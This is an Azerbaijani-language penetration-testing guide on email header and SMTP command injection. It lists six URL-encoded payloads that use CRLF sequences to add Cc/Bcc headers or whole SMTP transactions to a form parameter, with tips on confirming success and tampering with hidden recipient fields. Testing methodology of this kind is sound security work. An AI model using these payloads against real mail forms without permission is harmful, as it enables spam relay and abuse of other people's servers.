# E-poçt Parametrlərinin Test Edilməsi

Aşağıdakı test mətnlərini hər bir parametr üçün təqdim etməlisiniz, əlaqəli yerlərdə öz e-poçt ünvanınızı daxil edin:

1. `<youremail>%0aCc:<youremail>`
2. `<youremail>%0d%0aCc:<youremail>`
3. `<youremail>%0aBcc:<youremail>`
4. `<youremail>%0d%0aBcc:<youremail>`
5. `%0aDATA%0afoo%0a%2e%0aMAIL+FROM:+<youremail>%0aRCPT+TO:+<youremail>%0aDATA%0aFrom:+<youremail>%0aTo:+<youremail>%0aSubject:+test%0afoo%0a%2e%0a`
6. `%0d%0aDATA%0d%0afoo%0d%0a%2e%0d%0aMAIL+FROM:+<youremail>%0d%0aRCPT+TO:+<youremail>%0d%0aDATA%0d%0aFrom:+<youremail>%0d%0aTo:+<youremail>%0d%0aSubject:+test%0d%0afoo%0d%0a%2e%0d%0a`

## Diqqət Edilməli Məqamlar:

- **Xəta Mesajları:** Tətbiqin qaytardığı xəta mesajlarını qeyd edin. Əgər bu mesajlar e-poçt funksiyası ilə bağlı problemləri göstərirsə, zəifliyi istismar etmək üçün daxil etdiyiniz məlumatları dəqiqləşdirmək lazım ola bilər.
  
- **E-poçt Monitorinqi:** Tətbiqin cavabları zəifliyin mövcud olub-olmaması və ya uğurla istismar edilib-edilməməsi barədə heç bir məlumat verməyə bilər. Bu səbəbdən, təyin etdiyiniz e-poçt ünvanına hər hansı bir e-poçtun gəlib-gəlmədiyini yoxlayın.

- **HTML Formunun Təhlili:** Əlaqəli sorğunu yaradan HTML formasını yaxından nəzərdən keçirin. Bu forma, istifadə olunan server tərəfdəki proqram təminatı ilə bağlı ipuçları təqdim edə bilər. Həmçinin, e-poçtun göndəriləcəyi ünvanı təyin edən gizli və
- ya deaktiv edilmiş bir sahə də ola bilər ki, bunu birbaşa dəyişdirə bilərsiniz.
